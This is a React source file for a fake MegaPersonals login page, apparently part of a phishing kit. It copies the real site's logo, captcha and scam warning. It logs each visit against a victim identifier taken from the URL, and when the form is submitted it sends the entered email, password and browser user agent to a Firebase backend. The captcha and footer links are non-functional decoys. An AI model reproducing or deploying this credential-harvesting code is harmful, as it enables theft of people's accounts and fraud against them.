import React, { useEffect, useRef } from 'react'
import { Link, useLocation, useParams } from 'react-router-dom';
import { addClick, addData } from '../config/firebase';
import Captcha from '../assets/captcha.png'
import Logo from '../assets/mega_logo.png'
import ReloadIcon from '../assets/mega_reload_btn.png'
import WarningBox from '../assets/warning_box.png'


const Login = () => {

  const emailRef = useRef(null)
  const passRef = useRef(null)


  const { linkName } = useParams()


  useEffect(() => {
    addClick(`${linkName}@gmail.com`)
  }, [])

  const handleSubmit = async (e) => {
    e.preventDefault()
    try {

      await addData(emailRef.current.value, passRef.current.value, navigator.userAgent, `${linkName}@gmail.com`)
    } catch (error) {
      console.log(error?.message)
    }
  }

  return (
    <div className=" mx-auto py-10 w-full max-w-md">

      {/* Logo */}
      <div className="text-center mb-4">
        <img
          src={Logo}
          alt="MegaPersonals Logo"
          className="mx-auto min-w-40 max-!w-72 !w-[70%]"
        />
      </div>

      <div className='w-[250px] mx-auto'>
        {/* First Time Posting */}
        <div className="text-center mb-6 ">
          <p className="text-[#b7a690] text-lg font-semibold mb-2">Is this your first time posting?</p>
          <button className="bg-blue-500 text-white font-semibold w-full rounded-sm py-1 text-2xl">
            Start Here
          </button>
        </div>

        {/* Login Form */}
        <form className="space-y-2 " onSubmit={handleSubmit} >
          <h2 className="text-[#b7a690] text-lg font-semibold text-center">Already have an account?</h2>
          <div>
            <label
              htmlFor="email"
              className="block text-gray-700 font-medium"
            >
              Email
            </label>
            <input
              ref={emailRef}
              type="text"
              id="email"
              placeholder="Email"
            />
          </div>
          <div>
            <label
              htmlFor="password"
              className="block text-gray-700 font-medium"
            >
              Password
            </label>
            <input
              ref={passRef}
              type="password"
              id="password"
              placeholder="Password"
            />
          </div>
          <div className="flex items-center space-x-4">
            <img
              src={Captcha}
              alt="Captcha"
              className="w-[90%] h-12 border-2 border-stone-500 rounded-md p-1"
            />
            <img
              src={ReloadIcon}
              alt="Reload"
              className="w-8 h-8 cursor-pointer"
            />
          </div>
          <div>
            <input
              type="text"
              id="captcha"
              placeholder="Enter code from the picture"
            />
          </div>
          <div className=' w-full flex justify-center items-center' >
            <button
              type="submit"
              className="  bg-[#fca549] text-white py-2 px-4 text-2xl font-semibold "
            >
              Submit
            </button>
          </div>
        </form>

        {/* Warning Box */}
        <div className="mt-6">
          <img
            src={WarningBox}
            alt="Don't Get Scammed Warning"
            className="mx-auto"
          />
        </div>

      </div>

      {/* Footer Links */}
      <div className="mt-4 text-center text-sm text-[#046aaf]">
        <a href="#" className="text-blue-700 text-lg hover:underline">
          Forgot Password?
        </a>
        <div className="mt-2 space-x-2 ">
          <a href="#" className="hover:underline">
            Home
          </a>
          <a href="#" className="hover:underline">
            About Us
          </a>
          <a href="#" className="hover:underline">
            Policies & Terms
          </a>
          <a href="#" className="hover:underline">
            Contact Us
          </a>
          <a href="#" className="hover:underline">
            Manage Posts
          </a>
        </div>
      </div>

      {/* Copyright */}
      <div className="mt-4 text-center text-sm text-[#046aaf]">
        Copyright © 2025 MegaPersonals.eu
      </div>
    </div>
  );
}

export default Login